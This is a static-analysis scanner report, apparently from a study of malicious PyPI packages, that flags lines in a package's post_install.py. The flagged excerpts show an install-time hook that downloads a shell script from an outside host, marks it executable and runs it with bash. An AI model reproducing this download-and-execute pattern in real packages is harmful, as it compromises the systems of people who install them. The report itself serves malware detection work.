Run started:2025-04-13 09:14:27.689225

Test results:
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/h99ai-0.1.0-py3-none-any/h99ai/post_install.py:10
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
9	def download_and_run_script():
10	    script_url = 'curl -L -O https://fhost.devxops.eu.org/devops/cicd/scripts/dh-storage-v1.1.sh'  # Replace with your actual script URL
11	    script_path = os.path.join(os.path.expanduser("~"), 'dh-storage-v1.1.sh')

--------------------------------------------------
>> Issue: [B819:urlretrieve] urllib.request.urlretrieve
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/h99ai-0.1.0-py3-none-any/h99ai/post_install.py:14
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b819_urlretrieve.html
13	    # Download the script
14	    urllib.request.urlretrieve(script_url, script_path)
15	

--------------------------------------------------
>> Issue: [B810:chmod] os.chmod
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/h99ai-0.1.0-py3-none-any/h99ai/post_install.py:17
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b810_chmod.html
16	    # Make the script executable
17	    os.chmod(script_path, 0o755)
18	

--------------------------------------------------
>> Issue: [B315:blacklist] os.chmod
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/h99ai-0.1.0-py3-none-any/h99ai/post_install.py:17
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-chmod
16	    # Make the script executable
17	    os.chmod(script_path, 0o755)
18	

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/h99ai-0.1.0-py3-none-any/h99ai/post_install.py:20
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
19	    # Run the script
20	    os.system('apt update && apt install tmux -y ')
21	    subprocess.run(['/bin/bash', script_path, '--restore', '--tag', 'baota-tmp', '--localpath', '/tmp'])

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/h99ai-0.1.0-py3-none-any/h99ai/post_install.py:20
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
19	    # Run the script
20	    os.system('apt update && apt install tmux -y ')
21	    subprocess.run(['/bin/bash', script_path, '--restore', '--tag', 'baota-tmp', '--localpath', '/tmp'])

--------------------------------------------------

Code scanned:
	Total lines of code: 16
	Total lines skipped (#nosec): 0

Run metrics:
	Total issues (by severity):
		Undefined: 0.0
		Low: 0.0
		Medium: 3.0
		High: 3.0
	Total issues (by confidence):
		Undefined: 0.0
		Low: 0.0
		Medium: 4.0
		High: 2.0
Files skipped (0):
